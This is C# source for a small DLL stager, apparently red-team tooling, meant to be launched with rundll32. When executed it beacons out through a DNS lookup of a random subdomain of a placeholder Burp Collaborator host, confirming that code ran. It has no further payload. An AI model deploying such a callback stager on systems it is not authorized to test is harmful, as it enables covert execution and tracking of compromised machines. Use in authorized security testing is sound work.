using System;
using System.Net;
using System.Runtime.InteropServices;
using System.Windows.Forms;
using RGiesecke.DllExport;

// Add the UnmanagedExports Nuget 
// execute: rundll32.exe GoStager.dll,Start

namespace GoStager
{
    public class GoStager
    {
        public GoStager()
        {
            // hard-coded root canary domain
            string strTargetDomain = "<burp collab URL>";
            var random = new Random();

            string strDomainName = random.Next(1000).ToString() + "." + strTargetDomain;
            string strDomainAddress = DnsResolve(strDomainName);
            
            //MessageBox.Show("Do you want to continue?", "Question", MessageBoxButtons.YesNo);
        }
        [STAThread]
        public static void Main(string[] args)
        {
            new GoStager();
        }
        public static void Execute()
        {
            new GoStager();
        }
        private static string DnsResolve(string domainName)
        {
            string strAddr;
            try
            {
                strAddr = Dns.GetHostEntry(domainName).AddressList[0].ToString();
            }
            catch
            {
                strAddr = "Not Found";
            }

            return strAddr;
        }
    }
    public class Exports
    {
        [DllExport("Start", CallingConvention = CallingConvention.Cdecl)]
        public static void GoEntry(IntPtr hwnd,
        IntPtr hinst,
        string lpszCmdLine,
        int nCmdShow)
        {
            new GoStager();
        }
    }
}
